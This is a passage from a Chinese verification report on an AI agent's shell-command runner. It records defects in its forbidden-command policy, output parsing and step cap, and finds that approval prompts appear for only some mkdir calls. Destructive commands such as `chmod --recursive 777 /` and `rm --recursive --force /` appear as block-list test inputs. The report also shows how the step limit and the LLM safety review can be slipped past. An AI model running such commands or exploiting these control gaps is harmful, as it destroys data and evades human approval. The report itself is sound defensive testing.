- 建议：`hasHead` 只检查「每段的命令头」（段分隔符之后第一个 token），而不是全命令任意位置 token。§8 表格未要求匹配参数，属实现过度

**m2. `chmod --recursive` / `--recursive` 长选项漏判**
- 位置：`src/policy/forbidden.mjs` 的 `isRecursiveRmFlag` / `hasFlagFor` 正则 `^-[a-zA-Z]*R[a-zA-Z]*$`
- 实测：`chmod --recursive 777 /` → `null`（漏）；`rm --recursive --force /` → 命中
- 影响：GNU 风格长选项写法 `chmod --recursive 777 /` 不会被硬禁止。§8 表格只给了 `-R`，故**不算违反表格**，但属实现漏洞
- 建议：`hasFlagFor` 同时支持 `--recursive`

**m3. `splitBuffer` 用第一个 `endMark(\d+)` 而非最后一个**
- 位置：`src/ai/runner.mjs:166` `const match = endRe.exec(afterStart);`
- 实测（`.dispatch/verify-v3d/v14-split.mjs`）：输出含 `echo __MT_E_<nonce>__99` → 返回 `{"exitCode":99,"output":"echo"}`，后面真实输出被截空
- 影响：`history`、`set -x`、`bash -x`、`cat` 自己的脚本时偶发。协议 §4.2 只写了 `lastIndexOf(startMark)`，没规定 `endMark` 取哪个；`lastIndexOf(endMark)` 更稳
- 建议：把 `endRe.exec(afterStart)` 改成「取最后一个 `endMark(\d+)`」

**m4. 命令里含 `!` 或语法残缺时，包装串泄漏给模型**
- 位置：`src/ai/runner.mjs:buildPayload()`（命令直接插进 `( ${command}\n )`，无转义/预检）
- 实测：`rg --files -g "!node_modules" .` → `bash: !node_modules: event not found`，`output` 里含 `'; ( rg … ) 2>&1; printf '__MT_E_…__%s\n' "$?"`
- 影响：命令跑不了（`EXEC_QUIET`），内部标记泄漏给模型；但 shell 能恢复（后续命令正常），不污染后续
- 建议：写命令前对 `!` 做 `set +H`，或对已知会破壳的字符做预检并返回明确 `userText`

**m5. `MAX_STEPS=8` 只限轮次，不限命令条数**
- 位置：`src/ai/agent.mjs:494` `stopWhen: stepCountIs(MAX_STEPS)`
- 实测（`.dispatch/verify-v3d/v15b-cap.mjs`）：一轮内 30 个 tool_call → 30 条命令全执行
- 影响：协议「最多 8 步」与实测不符；模型若并发发多个 tool_call，可执行远超 8 条命令（成本/风险）
- 建议：在 `run_command.execute` 内加 `stepCount > MAX_STEPS` 时直接返回 denied

**m6. 同一轮 3 个 tool_call 的 `agent.step` 帧 index 复用**
- 位置：`src/ai/agent.mjs` `stepCount += 1`（每进一次 `execute` 就加 1，但 `emit running` 和 `emit done` 用同一个 `index`）
- 实测（T1）：3 个 tool_call → step 帧 index 序列 `1,2,3,1,2,3`（running 3 帧 + done 3 帧），前端若按 `index` upsert 会覆盖
- 影响：前端按 `stepId` upsert 就没问题（协议 §3.2 明说「按 stepId upsert」），但若按 index 会乱
- 说明：**不违反协议**（协议要 stepId），仅提醒 C 卡

---

## 3. 与执行者自述（REPORT-V3D）的差异（证伪点）

| 自述 | 我实测 | 结论 |
|---|---|---|
| 「node --test 348 / 0 fail」 | 两次独立复跑均 348 / 0 fail | ✅ 成立 |
| 「doctor 33/33」 | 第一次 32/33（浏览器类），30 分钟后重跑 33/33 | ✅ 基本成立（第一次受 C 卡并发干扰） |
| 「review-probe 6 次里 3 次有 fallback」 | 3 次运行 9 个 verdict，3 个 fallback（33%），Run3 只剩 1/3 | ⚠️ **说法不准确**：实际成功率 66.7%，且 3 次运行里 2 次有 fallback，比我预期更不稳 |
| 「AC7 三条真网关拿到合法 JSON（safe/danger/danger）」 | Run1 确实 safe/danger/danger，但 Run2/3 有 fallback | ⚠️ 部分成立，只有 Run1 干净 |
| 「agent.approval 帧带 risk/reviewWhy/reversible/reviewModel 四字段」 | 帧结构对，但 4 次 mkdir 只有 1 次弹审批 | ⚠️ **V9 三要求只满足 1 项（帧结构），「每问必弹」不成立** |
| 「git diff --stat app/ 输出 0 字节」 | 现在非空（+1206/−822） | ⚠️ 自述时 C 卡还没动手，现在被 C 卡改了（按任务约定不计 D 卡缺陷） |
| 「package.json 精确版本无 ^」 | `ai: "7.0.179"`、`@ai-sdk/openai-compatible: "3.0.94"` | ✅ 成立 |
| 「审阅提示词逐字用 §5.1」 | 逐字一致（`.dispatch/verify-v3d/v3d-prompt.mjs`） | ✅ 成立 |
| 「agent 硬性规则 10 条逐字」 | 10 条逐字一致、`DEFAULT_BASE_PROMPT` 逐字一致（`v3d-rules.mjs`） | ✅ 成立 |
| 「没用 toolApproval / generateObject」 | grep 只在注释 | ✅ 成立 |
| 「静默判定只算本命令自己的输出」 | 假 sessions + 真 PTY 均验证未被别的命令污染 | ✅ 成立 |
| 「输出截断 1000+3000=4000」 | 真 PTY `seq 1 5000` → 4018 字符（含省略标记），`truncated=true` | ✅ 成立 |
| （未宣称）TASK §9 「跑测试告诉我有没有失败」 | 13 步耗尽，半成品回答 | ❌ **失败**（自述漏了这条最重要的验收路径） |

---

## 4. 原始证据索引（`.dispatch/verify-v3d/`）

| 文件 | 对应 |
|---|---|
| `V1-test.txt` / `V1-test-rerun.txt` | V1 全量测试两次 |
| `V2-doctor-1.txt` / `V2-doctor-2.txt` | V2 doctor 两次 |
| `v3-forbidden.mjs` / `v3b-fp.mjs` / `v3c-fp2.mjs` / `v3c-fp3.mjs` | V3 硬禁止 20 条 + 挑刺 + 假阳性 |
| `v3d-prompt.mjs` / `v3d-rules.mjs` | 审阅提示词 / agent 提示词逐字比对 |
| `v4-allowlist.mjs` | V4 白名单 |
| `v5-judge.mjs` / `v5b-review-safety.mjs` | V5 判级链 + 安全命令真调 |
| `V6-config-probe.txt` | V6 配置 CSS |
| `V7-review-probe-x3.txt` | V7 审阅 3 连跑 |
| `V8-smoke-count.txt` | V8 数文件真跑 |
| `V9-smoke-mkdir.txt` / `V9-smoke-mkdir-retry.txt` / `v9-diag.mjs` / `v9b.mjs` / `v9c.mjs` | V9 mkdir + 审批字段 |
| `v14-split.mjs` / `v14-runner.mjs` / `v14-real.mjs` / `v14-realpty.mjs` / `v14-bigout.mjs` / `v14-inject.mjs` / `v14-recover.mjs` / `v14-stale.mjs` / `v14-story2.mjs` / `v14-user-story.mjs` / `V14-userstory-agent.txt` | V14 runner 全部反例 |
| `v15-agent.mjs` / `v15b-cap.mjs` | V15 agent 异常 tool_call |

---

## 5. 最终结论

- **代码质量 / 协议合规：PASS** —— 帧结构、判级链、白名单、硬禁止（表格 20 条全过）、配置四字段、错误码、提示词逐字、旧路径保留、测试 348/0、doctor 33/33，全部达标。
- **真实可用性：PASS_with_issues** —— M1（静默判定切断耗时命令，TASK §9 用户故事失败）与 M2（mkdir 半数不弹确认卡）是实打实的体验缺陷，且 M1 已知会直接影响普通用户。
- **安全性：未发现误放行** —— 全部失败方向都是 confirm/fail-closed。但 M2 的 `safe` 误判会让写操作**少弹**确认卡，值得产品侧关注。

**放行建议：可以放行（pass_with_issues）**，前提是：
1. M1 必须在下一卡（或本卡补丁）修掉——这是 TASK §9 明确要求验收的用户路径；
2. M2 需要产品/协议澄清「写操作是否允许被审阅判 safe 后静默执行」；
3. m1（`npm run format` 被硬禁止误拦）建议一并修，否则普通用户高频命令会不断弹卡；
4. C 卡完成后，最终验收时**再跑一次 doctor**（确认 `D7-1a.browserAutoTab` 绿）。

---

*本报告由独立核验会话生成，未修改任何被 git 跟踪的文件；临时脚本与原始输出均在 `.dispatch/verify-v3d/`（未进 git）。V9 创建的 `v3d-verify-tmp`、`v3d-smoke2` 已自行删除（`ls -d` 确认不存在）。*
